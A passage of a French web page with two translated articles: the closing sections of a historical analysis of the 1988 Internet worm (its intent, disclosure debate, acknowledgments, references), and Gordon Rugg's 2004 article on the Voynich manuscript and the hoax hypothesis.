            dans les derni&egrave;res semaines, diff&eacute;rentes failles de 
            s&eacute;curit&eacute; ont &eacute;t&eacute; d&eacute;couvertes qui 
            auraient pu &ecirc;tre utilis&eacute;es par le ver pour d&eacute;truire 
            des syst&egrave;mes. Peut-&ecirc;tre devrions-nous nous consid&eacute;rer 
            heureux d'avoir &eacute;chapp&eacute; &agrave; des &eacute;v&eacute;nements 
            qui auraient pu se r&eacute;v&eacute;ler bien plus catastrophiques, 
            et peut-&ecirc;tre nous devrions nous montrer reconnaissant d'avoir 
            appris autant sur les faiblesses pr&eacute;sentes dans nos syst&egrave;mes 
            de d&eacute;fense, toutefois je pense que nous devrions &eacute;changer 
            notre reconnaissance avec d'autres personnes que l'auteur de ce ver.</p>
          <p><i>Le ver &eacute;tait-il malicieux ?</i> Certaines personnes ont 
            sugg&eacute;r&eacute; que le worm &eacute;tait une innocente exp&eacute;rience 
            dont le contr&ocirc;le avait &eacute;chapp&eacute; &agrave; son cr&eacute;ateur, 
            et qu'il n'&eacute;tait pas sens&eacute; se propager si rapidement 
            et aussi fortement. Nous pouvons trouver des preuves dans le code 
            du ver qui permettent de soutenir et aussi de d&eacute;truire cette 
            hypoth&egrave;se. Il y a un certain nombre de bogues dans le ver qui 
            semblent &ecirc;tre le r&eacute;sultat d'une programmation faite &agrave; 
            la va-vite ou n&eacute;glig&eacute;e. Par exemple, dans la routine 
            <i>init()</i>, il y a un appel &agrave; la fonction block z&eacute;ro 
            <i>bzero()</i> qui utilise le block lui-m&ecirc;me alors qu'il devrait 
            utiliser l'adresse de ce block en tant qu'argument. Il est tout aussi 
            possible qu'une erreur soit &agrave; l'origine du manque d'efficacit&eacute; 
            des mesures de contr&ocirc;le de la population prises par le ver. 
            Il peut para&icirc;tre tout &agrave; fait plausible qu'une version 
            de d&eacute;veloppement du ver se soit &quot;perdue&quot; accidentellement, 
            et que &eacute;ventuellement son auteur avait l'intention de tester 
            la version finale dans des conditions bien pr&eacute;cises, dans un 
            environnement duquel il n'aurait pas pu s'&eacute;chapper. D'un autre 
            c&ocirc;t&eacute; il y a des preuves consid&eacute;rables que le ver 
            a &eacute;t&eacute; cr&eacute;e de telle fa&ccedil;on &agrave; ce 
            qu'il se reproduise vite et se propage sur de grandes distances. On 
            pourrait avancer que les routines de contr&ocirc;le de la population 
            sont faibles parce que l'auteur en a d&eacute;cid&eacute; ainsi : 
            il y a un compromis entre propager le ver le plus vite possible et 
            le faire se reproduire assez pour &ecirc;tre d&eacute;tect&eacute; 
            et stopp&eacute;. Un ver existera pour un certain laps de temps et 
            effectuera une certaines quantit&eacute; de t&acirc;ches m&ecirc;me 
            s'il pert au lanc&eacute; de d&eacute;s imaginaire (duel d&eacute;crit 
            plus haut qui d&eacute;termine quel ver continue &agrave; fonctionner) 
            ; qui plus est, 1 ver sur 7 devient immortel et ne peux pas &ecirc;tre 
            supprim&eacute; au lanc&eacute; des d&eacute;s. Il est plus qu'&eacute;vident 
            que le ver a &eacute;t&eacute; con&ccedil;u pour entraver les efforts 
            destin&eacute;s &agrave; le stopper m&ecirc;me une fois qu'il a &eacute;t&eacute; 
            identifi&eacute; puis captur&eacute;. Il est certainement arriv&eacute; 
            &agrave; ses fins sur ce point l&agrave;, puisqu'il a fallu au moins 
            un jour avant que le dernier mode d'infection (relatif au serveur 
            <i>finger</i>) soit d&eacute;couvert, analys&eacute; et annonc&eacute; 
            publiquement ; le ver s'est montr&eacute; tr&egrave;s performant pour 
            ce qui est de se reproduire &agrave; ce moment, m&ecirc;me sur les 
            syst&egrave;mes sur lesquels le probl&egrave;me <i>debug</i> de <i>sendmail</i> 
            &eacute;tait corrig&eacute; et <i>rexec</i> &eacute;teint. Pour finir, 
            il est &eacute;vident que l'auteur du worm a d&eacute;lib&eacute;r&eacute;ment 
            introduit le worm sur un site qui ne lui appartenait pas, et qui &eacute;tait 
            &agrave; moiti&eacute; ouvert pour accueillir d'&eacute;ventuels utilisateurs 
            ext&eacute;rieurs, abusant donc de l'hospitalit&eacute; de ce serveur. 
            Il semble m&ecirc;me avoir &eacute;t&eacute; plus loin dans l'abus 
            de la confiance qui lui &eacute;tait donn&eacute;e en effa&ccedil;ant 
            un fichier de log qui aurait pu r&eacute;v&eacute;ler des informations 
            qui auraient permis de faire le lien entre son site (serveur) personnel 
            et l'infection. Je pense que l'innocence revient &agrave; la communaut&eacute; 
            des chercheurs plut&ocirc;t qu'au cr&eacute;ateur du ver.</p>
          <p><i>Est-ce que une publication sur les d&eacute;tails du worm ne va 
            pas nuire &agrave; la s&eacute;curit&eacute; ?</i> Dans un sens, le 
            ver lui-m&ecirc;me a r&eacute;solu le probl&egrave;me : il s'est publi&eacute; 
            lui-m&ecirc;me en s'envoyant &agrave; des centaines ou des milliers 
            de machines &agrave; travers le monde. Bien s&ucirc;r une personne 
            mal intentionn&eacute;e qui d&eacute;sire utiliser les astuces du 
            ver devrait passer par les m&ecirc;me efforts que nous avons du traverser 
            afin de comprendre le programme, mais l&agrave; encore il ne nous 
            a fallut qu'une semaine pour d&eacute;compiler le programme, bref 
            m&ecirc;me s'il faut beaucoup de courage pour hacker le ver, il est 
            clair que ce n'est pas difficile pour un programmeur d&eacute;cent. 
            L'une des astuces les plus efficaces du ver annon&ccedil;ait son arriv&eacute;e 
            - le gros du hack <i>sendmail</i> est visible dans le fichier de log, 
            et quelques minutes d'&eacute;tude des sources permettent de d&eacute;couvrir 
            le reste de l'astuce. L'algorithme rapide utilis&eacute; pour les 
            mots de passe par le ver pourrait s'av&eacute;rer utile &agrave; des 
            m&eacute;chants, mais il existe au moins deux autres impl&eacute;mentations 
            plus rapides disponibles depuis un an ou plus, bref ce n'est pas vraiment 
            secret ou original. Enfin, les d&eacute;tails du ver ont suffisamment 
            bien &eacute;t&eacute; &eacute;bauch&eacute;s sur diff&eacute;rents 
            newsgroups ou listes de diffusions que les principaux exploits du 
            ver sont de la connaissance g&eacute;n&eacute;rale. Je crois qu'il 
            est bien plus important de comprendre ce qu'il s'est pass&eacute;, 
            afin que nous puissions r&eacute;duire les chances que cela se reproduise 
            &agrave; nouveau, plut&ocirc;t que de passer notre temps dans un effort 
            futile &agrave; couvrir l'affaire aux yeux de tous, sauf aux yeux 
            des m&eacute;chants. Des correctifs pour les sources et les binaires 
            sont largement diffus&eacute;s, et toute personne utilisant un syst&egrave;me 
            vuln&eacute;rable doit imm&eacute;diatement r&eacute;cup&eacute;rer 
            ces correctifs, si cela n'est pas d&eacute;j&agrave; fait.</p>
          <p class="texttitre"><a name="p6"></a>6. Conclusion</p>
        </div>
        <blockquote> 
          <div align="left">It has raised the public awareness to a considerable 
            degree. [R H Morris, quoted in the New York Times 11/5/88]</div>
        </blockquote>
        <div align="left"> 
          <p>Cette citation est l'un des euph&eacute;mismes de l'ann&eacute;e. 
            L'histoire du ver a fait la couverture du New York Times et d'autres 
            quotidiens pendant plusieurs jours. Il a &eacute;t&eacute; le sujet 
            de pr&eacute;dilection des t&eacute;l&eacute;visions et des radios. 
            M&ecirc;me la bande dessin&eacute;e Bloom County s'est moqu&eacute;e 
            de cet &eacute;v&eacute;nement.</p>
          <p>Notre communaut&eacute; n'avait jamais &eacute;t&eacute; autant sous 
            les projecteurs auparavant, et aux vues des responsabilit&eacute;s, 
            cela nous a effray&eacute;. Je ne vous donnerait pas de banalit&eacute;s 
            fantaisistes sur comment cette exp&eacute;rience va nous changer, 
            mais je pense que plus ces articles seront ignor&eacute;s, moins nous 
            serons en s&eacute;curit&eacute;, et j'ai le sentiment qu'une meilleure 
            compr&eacute;hension de cette crise qui est derri&egrave;re nous, 
            nous aidera &agrave; mieux g&eacute;rer la prochaine. Esp&eacute;rons 
            que nous aurons autant de chance l&agrave; prochaine fois que nous 
            en avons eu cette fois &ccedil;i.</p>
          <p class="texttitre"><a name="p7"></a>Remerciements</p>
          <p>Personne ne doit &ecirc;tre tenu responsable pour les inexactitudes 
            ici except&eacute; moi, mais il y a vraiment beaucoup de personnes 
            &agrave; remercier pour avoir aid&eacute; &agrave; d&eacute;compiler 
            le ver et pour avoir aid&eacute; &agrave; documenter cette &eacute;pid&eacute;mie.<br>
            Dave Pare et Chris Torek &eacute;taient au centre de l'action durant 
            les longues nuits pass&eacute;es &agrave; Berkeley, et ils avaient 
            le soutien et les conseils de Keith Bostic, Phil Lapsley, Peter Yee, 
            Jay Lepreau et un millier d'autres. Glenn Adams et Dave Siegel ont 
            fourni de bonnes informations sur l'attaque du laboratoire d'I.A. 
            du MIT, alors que Steve Miller me donna les d&eacute;tails sur Maryland, 
            Jeff Forys sur Utah, et Phil Lapsley, Peter Yee et Keith Bostic sur 
            Berkeley. Bill Cheswick m'envoya quelques anecdotes de AT&amp;T Bell 
            Labs. Jim Hayes me donna le r&eacute;sum&eacute; d&eacute;taill&eacute; 
            des probl&egrave;mes de s&eacute;curit&eacute; qui se sont pr&eacute;sent&eacute;s 
            &agrave; l'UC de Santa Cruz. Eric Allman, Keith Bostic, Bill Cheswick, 
            Mike Hibler, Jay Lepreau, Chris Torek et Mike Zeleznik ont fourni 
            beaucoup de commentaires et de critiques int&eacute;ressantes. Merci 
            &agrave; vous tous, ainsi qu'&agrave; tous ceux que j'ai oubli&eacute; 
            de mentionner.</p>
          <p>Le document de Matt Bishop &quot;A Fast Version of the DES and a 
            Password Encryption Algorithm&quot;, (c) 1987 by Matt Bisbop and the 
            Universities Space Research Association, a &eacute;t&eacute; utile 
            pour (l&eacute;g&egrave;rement) comprendre le myst&egrave;re du DES 
            pour moi. Toute personne d&eacute;sirant comprendre le hack du DES 
            par le worm devrait d'abord jeter un coup d'oeil &agrave; ce document.</p>
          <p>Les documents suivants sont r&eacute;f&eacute;renc&eacute;s pour 
            les diff&eacute;rentes citations et pour d'autres mat&eacute;riaux 
            :</p>
          <p><i>Data Encryption Standard</i>, FIPS PUB 46, National Bureau of 
            Standards, Washington D.C., January 15, 1977.</p>
          <p>F. T. Grampp and R. H. Morris, &quot;UNIX Operating System Security,&quot; 
            in the <i>AT&amp;T Bell Laboratories Technical Journal</i>, October 
            1984, Vol. 63, No. 8, Part 2, p. 1649.</p>
          <p>Brian W. Kernighan and Dennis Ritchie, <i>The C Programming Language</i>, 
            Second Edition, Prentice Hall: Englewood Cliffs, NJ, (C) 1988.</p>
          <p>John Markoff, &quot;Author of computer 'virus' is son of U.S. Electronic 
            Security Expert,&quot; p. 1 of the <i>New York Times</i>, November 
            5, 1988.</p>
          <p>John Markoff, &quot;A family's passion for computers, gone sour,&quot; 
            p. 1 of the <i>New York Times</i>, November 11, 1988.</p>
          <p>Robert Morris and Ken Thompson, &quot;Password Security: A Case History,&quot; 
            dated April 3, 1978, in the <i>UNIX Programmer's Manual</i>, in the 
            <i>Supplementary Documents</i> or the <i>System Manager's Manual</i>, 
            depending on where and when you got your manuals.</p>
          <p>Robert T. Morris, &quot;A Weakness in the 4.2BSD Unix TCP/IP Software,&quot; 
            AT&amp;T Bell Laboratories Computing Science Technical Report #117, 
            February 25, 1985. This paper actually describes a way of spoofing 
            TCP/IP so that an untrusted host can make use of the <i>rsh</i> server 
            on any 4.2 BSD UNIX system, rather than an attack based on breaking 
            into accounts on trusted hosts, which is what the worm uses. </p>
          <p>Brian Reid, &quot;Massive UNIX breakins at Stanford,&quot; RISKS-FORUM 
            Digest, Vol. 3, Issue 56, September 16, 1986.</p>
          <p>Dennis Ritchie &quot;On the Security of UNIX,&quot; dated June 10, 
            1977, in the same manual you found the Morris and Thompson paper in.</p>
          <p>Ken Thompson, &quot;Reflections on Trusting Trust,&quot; 1983 ACM 
            Turing Award Lecture, in the Communications of the ACM, Vol. 27, No. 
            8, p. 761, August 1984.</p>
          <hr>
          <p><b>D&eacute;tails</b></p>
        </div>
        <dl>
          <dt>(<a href="#rf1" 
  name=f1>1</a>) 
          <dd>Internet est un r&eacute;seau logique constitu&eacute; d'un ensemble 
            des r&eacute;seaux physiques, tous fonctionnant gr&acirc;ce &agrave; 
            la classe IP des protocoles r&eacute;seaux. 
            <p></p>
        </dl>
        <dl>
          (<a href="#rf2" 
  name=f2>2</a>) 
          <dd>VAX et Sun-3 sont des mod&egrave;les d'ordinateurs construits respectivement 
            par Digital Equipment Corp. et Sun Microsystems Inc. UNIX est un produit 
            Registered Bell of AT&amp;T Trademark Laboratories. 
            <p></p>
        </dl>
        <dl>
          <dt>(<a href="#rf3" 
  name=f3>3</a>) 
          <dd>En r&eacute;alit&eacute;, comme la majorit&eacute; du code de la 
            distribution de Berkeley, le serveur <i>finger</i> venait d'un peu 
            partout ; dans ce cas, il semble que le MIT en soit la source. 
            <p></p>
        </dl>
        <dl>
          <dt>(<a href="#rf4" 
  name=f4>4</a>) 
          <dd>R&eacute;f&eacute;rez-vous par exemple &agrave; l'Appendice B, section 
            1.4 de la seconde &eacute;dition de The C Programming Language par 
            Kernighan et Ritchie. 
            <p></p>
        </dl>
        <dl>
          <dt>(<a href="#rf5" 
  name=f5>5</a>) 
          <dd>Une petite exception : l'attaque <i>sendmail</i> n'utile pas <i>sendworm()</i> 
            puisqu'elle doit g&eacute;rer le protocole SMTP en plus de l'interpr&eacute;teur 
            de commande, mais le principe reste le m&ecirc;me. 
            <p></p>
        </dl>
        <dl>
          <dt>(<a href="#rf6" 
  name=f6>6</a>) 
          <dd>Pour ceux qui aiment les d&eacute;tails : le premier appel &agrave; 
            <i>cracksome()</i> sert &agrave; lire les fichiers syst&egrave;mes. 
            Le ver fait au moins un appel &agrave; <i>cracksome()</i> une seconde 
            fois pour s'attaquer aux mots de passe faibles. Cela constitue au 
            moins un passage dans la boucle principale. La troisi&egrave;me fois, 
            <i>cracksome()</i> teste un des passwords de sa liste favorite &agrave; 
            chaque appel ; le ver la quitte s'il &eacute;choue au jeu de d&egrave;s 
            et si plus de dix mots ont &eacute;t&eacute; test&eacute;, cela constitue 
            donc au moins six boucles, deux mots sur chaque boucle pour cinq boucles 
            pour atteindre dix mots, puis une autre boucle pour passer ce nombre. 
            Au total on atteint un minimum de 7 boucles. Si chacune des 7 boucles 
            prend un laps de temps maximum &agrave; attendre des client cela demandera 
            un minimum de 17,5 minutes, mais la v&eacute;rification des 2 minutes 
            peut quitter plus t&ocirc;t si un client se connecte et que le serveur 
            pert le challenge, en cons&eacute;quence 15,5 minutes d'attente en 
            plus du temps d'ex&eacute;cution constituent le cycle de vie minimum. 
            Sur cette p&eacute;riode un ver attaquera au moins 8 machines lors 
            de la routine d'infection d'h&ocirc;tes, et testera environ 18 mots 
            de passe pour chaque compte, attaquant plus d'h&ocirc;tes si des comptes 
            sont cass&eacute;s. 
            <p></p>
          </dd>
        </dl>
      </div></td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="voynich"></a>Le 
      myst&egrave;re du manuscrit de Voynich</td>
  </tr>
  <tr> 
    <td valign="top" class="textpetit"> <p>21 Juin 2004</p>
      <p>Nouvelle analyse d'un document m&eacute;di&eacute;val connu mais crypt&eacute; 
        sugg&eacute;rant un contenu inint&eacute;ressant.</p>
      <p>Par Gordon Rugg<br>
        Traduit de l'anglais par Flyers</p>
      <p><br>
        En 1912 Wilfrid Voynich, un am&eacute;ricain passion&eacute; par l'&eacute;change 
        de livres rares, fit la d&eacute;couverte de sa vie dans la biblioth&egrave;que 
        d'une universit&eacute; J&eacute;suite proche de Rome : un manuscrit d'environ 
        230 pages, &eacute;crit dans un langage peu commun et richement illustr&eacute; 
        d' images bizarres de plantes, de sph&egrave;res merveilleuses et de femmes 
        se baignant. Voynich reconnu imm&eacute;diatement l'importance de cette 
        nouvelle acquisition. Bien qu'il ressemblait superficiellement aux manuels 
        m&eacute;di&eacute;vaux d'alchimie ou d'herberisterie, le manuscrit paraissait 
        &ecirc;tre enti&egrave;rement &eacute;crit en code. Certaines sp&eacute;cificit&eacute;s 
        des illustrations, comme les coiffures, sugg&eacute;rait que le livre 
        &eacute;tait paru entre 1470 et 1500, et une lettre du 17&egrave;me si&egrave;cle 
        accompagnant le manuscrit d&eacute;clarait qu'il avait &eacute;t&eacute; 
        rechercher par Rudolph II, le Saint Empereur Romain, en 1586. Durant les 
        ann&eacute;es 1600, au moins deux disciples ont apparemment essay&eacute;s 
        de d&eacute;chiffrer le manuscrit, puis il a disparu durant environ 250 
        ans jusqu'&agrave; ce que Voynich le d&eacute;terre.</p>
      <p><br>
        Voynich demanda aux meilleurs cryptographes de son temps de d&eacute;coder 
        l'&eacute;trange manuscrit, qui ne correspondait &agrave; aucuns des langages 
        connus. Mais en d&eacute;pit de 90 ans d'efforts de quelques un des meilleurs 
        casseurs de code au monde, personne n'a &eacute;t&eacute; capable de d&eacute;chiffrer 
        la d&eacute;couverte de Voynich, ainsi le manuscrit est devenu connu. 
        La nature et l'origine du manuscrit reste un myst&egrave;re. Les &eacute;checs 
        des tentatives de cassage du code a augment&eacute; la suspicion qu'il 
        n'y a aucun cryptage &agrave; casser. Le texte de Voynich peut ne contenir 
        aucun message du tout, et le manuscrit peut simplement &ecirc;tre un canular 
        &eacute;labor&eacute;.</p>
      <p><br>
        Les critiques de cette hypoth&egrave;se ont argument&eacute; que le manuscrit 
        de Voynich est trop complexe pour ne pas avoir de sens. Comment un farceur 
        m&eacute;di&eacute;val peut &eacute;crire 230 pages d'un manuscrit avec 
        autant de r&eacute;gularit&eacute; dans la structure et la distribution 
        des mots? Mais j'ai r&eacute;cemment d&eacute;couvert que l'on peut r&eacute;pliquer 
        plusieurs des dispositifs remarquables de la d&eacute;couverte de Voynich 
        en utilisant un outil simple de codage qui &eacute;tait disponible au 
        16&egrave;me si&egrave;cle. Le texte g&eacute;n&eacute;rer par cette technique 
        ressemble plus au texte de Voynich, mais c'est du baragouin, sans aucun 
        message cach&eacute;. Cette d&eacute;couverte ne prouve pas que le manuscrit 
        de Voynich est un canular, mais il soutient la th&eacute;orie de longue 
        date qu'un aventurier Anglais appeler Edward Kelley peut avoir concocter 
        le document pour tromper Rudolph II.<br>
        (L'empereur proposait de payer la somme de 600 ducats--l'&eacute;quivalent 
        d'environ 50 000 $ actuel--pour le manuscrit.)</p>
      <p><br>
        Peut-&ecirc;tre plus important, je crois que la m&eacute;thode utilis&eacute;e 
        pour l'analyse du myst&egrave;re Voynich peut &ecirc;tre appliqu&eacute;e 
        &agrave; d'autres questions compliqu&eacute;es dans d'autres domaines. 
        Aborder ce puzzle n&eacute;cessite des connaissances dans plusieurs domaines, 
        incluant la cryptographie, les langues et l'histoire m&eacute;di&eacute;vale. 
        En tant que chercheur sur le raisonnement--l'&eacute;tude des processus 
        utilis&eacute;s pour r&eacute;soudre des probl&egrave;mes complexes--j'ai 
        vu mon travail sur le manuscrit de Voynich comme un test informel d'une 
        approche qui peut &ecirc;tre utilis&eacute;e pour identifier de nouvelle 
        voies d'aborder des questions scientifique de longue date. L'&eacute;tape 
        principale est de d&eacute;terminer les points forts et les faiblesses 
        de l'expertise dans les domaines appropri&eacute;s.</p>
      <p><br>
        [NdT: Le titre original ici &eacute;tait &quot;Baby God's Eye?&quot; comme 
        cette phrase ne voulait rien dire je ne savais pas si je devais la traduire 
        en B&eacute;b&eacute; l'Oeil de Dieu ou L'Oeil de Dieu de B&eacute;b&eacute;, 
        j'ai donc trancher pour cette deuxi&egrave;me traduction]<br>
        L'Oeil de Dieux de B&eacute;b&eacute;?<br>
        Le premier pr&eacute;tendu d&eacute;cryptage du manuscrit de Voynich apparu 
        en 1921. William R. Newbold, un professeur de philosophie &agrave; l'Universit&eacute; 
        de Pennsylvanie, cl&acirc;ma que chaque caract&egrave;re dans le manuscrit 
        de Voynich contenait les courses minuscules d'un stylo qui ne pouvait 
        &ecirc;tre vues que gr&acirc;ce &agrave; un effet d'optique et que ces 
        courbes formaient un ancien syst&egrave;me st&eacute;ganographique Grecque. 
        Bas&eacute; sur sa lecture du code, Newbold d&eacute;clara que le manuscrit 
        de Voynich avait &eacute;t&eacute; &eacute;crit par Roger Bacon un philosophe-scientifique 
        du 13&egrave;me si&egrave;cle et d&eacute;crivant des d&eacute;couvertes 
        tel que l'invention du microscope. Cependant, une d&eacute;cennie plus 
        tard, les critiques ont d&eacute;savou&eacute; la solution de Newbold 
        en montrant que les courbes microscopiques des lettres n'&eacute;tait 
        que des fissures naturelles dans l'encre.</p>
      <p><br>
        Le manuscrit de Voynich a sembl&eacute; &ecirc;tre un code peu commun, 
        une langue inconnue ou un canular sophistiqu&eacute;.</p>
      <p><br>
        La tentative de Newbold n'&eacute;tait que le d&eacute;part d'une longue 
        s&eacute;rie d'&eacute;checs. Dans les ann&eacute;es 1940 les cryptographes 
        amateurs Joseph M. Feely et Leonell C. Strong ont appliqu&eacute;s un 
        algorithme de substitution qui int&eacute;gr&eacute; les lettres Romaines 
        &agrave; la place des caract&egrave;res dans la d&eacute;couverte de Voynich, 
        mais la pr&eacute;tendue traduction semblait ne rien signifier. A la fin 
        de la Seconde Guerre Mondiale les cryptographes de l'arm&eacute;e Am&eacute;ricaine 
        qui avait casser les codes du Japanese Imperial Navy ont pass&eacute;s 
        quelques temps sur des textes chiffr&eacute;s de l'antiquit&eacute;. L'&eacute;quipe 
        d&eacute;crypta chacun d'eux &agrave; l'exception du manuscrit de Voynich.</p>
      <p><br>
        En 1978 John Stojko, d&eacute;clara que le texte &eacute;tait &eacute;crit 
        en Ukrainien sans les voyelles, mais sa traduction--qui incluait des phrases 
        tel que &quot;Le vide est ce pourquoi L'oeil de Dieu de B&eacute;b&eacute; 
        se bat&quot;--n'&eacute;tait ni en accord avec les illustrations du manuscrit 
        ni avec l'histoire Ukrainienne. En 1987 un physicien nomm&eacute; Leo 
        Levitov affirmait que le document a &eacute;t&eacute; &eacute;crit par 
        les Cathars, une secte d'h&eacute;r&eacute;tiques qui prosp&eacute;rait 
        en France m&eacute;di&eacute;vale, et a &eacute;t&eacute; &eacute;crit 
        dans un pidgin* compos&eacute; de mots venant de diff&eacute;rents langages. 
        La traduction de Levitov, malgr&eacute; tout, &eacute;tait en d&eacute;saccord 
        avec la th&eacute;ologie Cathar suffisament document&eacute;e.<br>
        (*)pidgin: syt&egrave;me linguistique composite servant &agrave; la communication 
        entre gens de parlers diff&eacute;rents </p>
      <p><br>
        En outre, toutes ces combinaisons utilisaient des m&eacute;chanismes permettant 
        &agrave; un m&ecirc;me mot du manuscrit de Voynich d'&ecirc;tre traduit 
        d'une mani&egrave;re &agrave; un endroit du manuscrit et d'une autre fa&ccedil;on 
        dans une autre partie du manuscrit. Par exemple, une &eacute;tape dans 
        la solution de Newbold impliquait le d&eacute;cryptage d'anagrammes, ce 
        qui est notoirement impr&eacute;cis: l'anagramme ADER, par exemple, pouvait 
        &ecirc;tre interpr&eacute;t&eacute; comme READ, DARE ou DEAR. La plupart 
        des savants s'accordaient sur le fait que tous les essais de d&eacute;codage 
        du manuscrit de Voynich &eacute;taient teint&eacute;s d'un degr&eacute; 
        d'ambigu&iuml;t&eacute; inacceptable. D'ailleurs, aucune de ces m&eacute;thodes 
        ne pourrait encod&eacute; un texte en clair vers un texte crypt&eacute; 
        avec les propri&eacute;t&eacute;s les plus importantes du manuscrit de 
        Voynich.</p>
      <p><br>
        Si le manuscrit n'est pas un code, peut-il &ecirc;tre un langage inconnu? 
        Quoique nous ne puissions pas d&eacute;chiffrer le texte il pr&eacute;sente 
        un ensemble extraordinaire de r&eacute;gularit&eacute;. Par exemple, les 
        mots les plus communs apparaissent souvent deux fois ou plus dans une 
        ligne. Pour repr&eacute;senter les mots, je vais utiliser l'Alphabet Europ&eacute;en 
        de Voynich (European Voynich Alphabet), une convention pour traduire les 
        caract&egrave;res du manuscrit de Voynich vers des lettres Romaines. Un 
        exemple tir&eacute; du folio 78R du manuscrit o&ugrave; nous lisons: &quot;qokedy 
        qokedy dal qokedy qokedy&quot;. Ce degr&eacute; de r&eacute;p&eacute;tition 
        est introuvable dans les autres langages connus. R&eacute;ciproquement, 
        Le manuscrit de Voynich ne contient que tr&egrave;s peu de phrases o&ugrave; 
        deux ou trois mots diff&eacute;rents apparaissent r&eacute;guli&egrave;rement 
        ensemble. Ces caract&eacute;ristiques font qu'il est peu probable que 
        le langage Voynich soit un langage humain--il est simplement trop diff&eacute;rent 
        des autres langues.</p>
      <p><br>
        La troisi&egrave;me possibilit&eacute; est que le manuscrit &eacute;tait 
        un canular con&ccedil;u pour un gain mon&eacute;taire ou qu'il s'agit 
        de la cr&eacute;ation d'un quelconque alchimiste fou insignifiant. La 
        complexit&eacute; linguistique du manuscrit semble contredire cette th&eacute;orie. 
        En plus des r&eacute;p&eacute;titions des mots, il y a diff&eacute;rentes 
        r&eacute;gularit&eacute;s dans la structure interne des mots. La syllabe 
        commune &quot;qo&quot;, par exemple, n'apparait qu'en d&eacute;but de 
        mot. La syllabe &quot;chek&quot; devrait appara&icirc;tre au d&eacute;but 
        d'un mot, mais si cela se passe dans le m&ecirc;me mot que &quot;qo&quot;, 
        alors &quot;qo&quot; vient toujours avant &quot;chek&quot;. La syllabe 
        commune &quot;dy&quot; apparait g&eacute;n&eacute;ralement &agrave; la 
        fin du mot et occasionnellement au d&eacute;but mais jamais &agrave; la 
        fin.</p>
      <p><br>
        Un simple &quot;pick and mix&quot; canular qui combine les syllabes au 
        hasard ne peut produire un texte avec autant de r&eacute;gularit&eacute;s. 
        Le manuscrit de Voynich est &eacute;galement bien plus complexe que n'importe 
        quel discours pathologique d&ucirc;e &agrave; un dommage c&eacute;r&eacute;bral 
        ou de d&eacute;sordres psychologiques. M&ecirc;me si un alchimiste fou 
        avait construit une grammaire depuis un langage inventer et apr&egrave;s 
        avait passer des ann&eacute;es &eacute;crivant un manuscrit employant 
        cette grammaire, le texte en r&eacute;sultant ne partagerait pas les diff&eacute;rentes 
        sp&eacute;cificit&eacute;s statistiques de la d&eacute;couverte de Voynich. 
        Par exemple, la taille des mots du manuscrit de Voynich forme une distribution 
        binomiale--qui est, les mots les plus communs ont cinq ou six caract&egrave;res, 
        et le nombre d'occurence des mots avec plus ou moins de caract&egrave;res 
        diminue rapidement depuis ce pic en une courbe sym&eacute;trique en forme 
        de cloche. Ce type de distribution est extr&ecirc;mement peu courant dans 
        un langage humain. Dans presque toutes les langues humaines, la distribution 
        de la taille des mots est plus large et asym&eacute;trique, avec un nombre 
        d'occurence plus grand des mots relativement longs. Il est vraiment inhabituel 
        que la distribution binomiale du texte de Voynich aurait pu &ecirc;tre 
        d&eacute;lib&eacute;r&eacute;ment une partie d'un canular, parce que ce 
        concept statistique n'a &eacute;t&eacute; invent&eacute; que plusieurs 
        si&egrave;cles apr&egrave;s que le manuscrit f&ucirc;t &eacute;crit. </p>
      <p><br>
        Raisonnement d'expert<br>
        En r&eacute;sum&eacute;, le manuscrit de Voynich apparaissait comme &eacute;tant 
        un code extr&ecirc;mement inhabituel, un langage &eacute;trange et inconnu 
        ou un canular sophistiqu&eacute;, et il n'y avait aucune mani&egrave;re 
        &eacute;vidente pour r&eacute;soudre le probl&egrave;me. Il se trouvait 
        que ma coll&egrave;gue Joanne Hyde et moi cherchions un tel puzzle quelques 
        ann&eacute;es auparavant. Nous avions d&eacute;velopp&eacute; une m&eacute;thode 
        pour une r&eacute;&eacute;valuation critique de l'expertise et du raisonnement 
        utilis&eacute;s lors de la recherche de la r&eacute;solution de probl&egrave;mes 
        compliqu&eacute;s. Comme test pr&eacute;liminaire, j'ai appliqu&eacute; 
        cette m&eacute;thode aux recherches sur le manuscrit de Voynich. J'ai 
        commenc&eacute; en d&eacute;terminant les types d'expertises pr&eacute;c&eacute;demment 
        appliqu&eacute;es au probl&egrave;me.</p>
      <p><br>
        L'hypoth&egrave;se que les sp&eacute;cificit&eacute;s du manuscrit de 
        Voynich est contradictoire &agrave; n'importe quel langage humain &eacute;tait 
        bas&eacute; sur les expertises substantielles appropri&eacute;es des linguistes. 
        Cette conclusion semblait juste, alors j'ai proc&eacute;d&eacute; &agrave; 
        l'hypoth&egrave;se du canular. La plupart des personnes qui ont &eacute;tudi&eacute;es 
        le manuscrit de Voynich s'entendait pour dire que le texte de Voynich 
        &eacute;tait trop complexe pour &ecirc;tre un canular. J'ai trouver, malgr&eacute; 
        tout, que cette opinion &eacute;tait plus bas&eacute;e sur des intuitions 
        plut&ocirc;t que sur des &eacute;vidences. Il n'y a aucun corps d'expertise 
        sur la fa&ccedil;on d'imiter un long texte chiffr&eacute; m&eacute;di&eacute;val, 
        car il est difficile de trouver des exemples de tels textes, encore moins 
        de canulars de ce genre.</p>
      <p><br>
        Plusieurs chercheurs, comme Jorge Stolfi de l'Universit&eacute; de Campinas 
        au Br&eacute;sil, s'&eacute;tait demand&eacute; si le manuscrit de Voynich 
        a &eacute;t&eacute; r&eacute;alis&eacute; en utilisant un g&eacute;n&eacute;rateur 
        de texte utilisant des tables al&eacute;atoires. Ces tables ont des cellules 
        contenant des caract&egrave;res et des syllabes; l'utilisateur s&eacute;lectionne 
        une s&eacute;quence de cellules--peut-&ecirc;tre en lan&ccedil;ant des 
        d&eacute;s--et les combines pour former un mot. Cette technique peut g&eacute;n&eacute;rer 
        certaines des r&eacute;gularit&eacute;s dans les mots du texte de Voynich. 
        Avec la m&eacute;thode de Stolfi, la premi&egrave;re colonne de la table 
        peut contenir des syllabes pr&eacute;fixes, comme &quot;qo&quot;, apparaissant 
        seulement au d&eacute;but des mots; la deuxi&egrave;me colonne peut contenir 
        des &quot;midfixes&quot; (des syllabes apparaissant au milieu des mots) 
        comme &quot;chek&quot;, et la troisi&egrave;me colonne peut contenir des 
        syllabes suffixes comme &quot;y&quot;. Le choix d'une syllabe de chaque 
        colonne dans l'ordre produirait des mots avec la structure caract&eacute;ristique 
        du manuscrit de Voynich. Certaines des cellules doivent &ecirc;tre vide, 
        de sorte que l'on puisse cr&eacute;&eacute; des mots manquant d'un prefixe, 
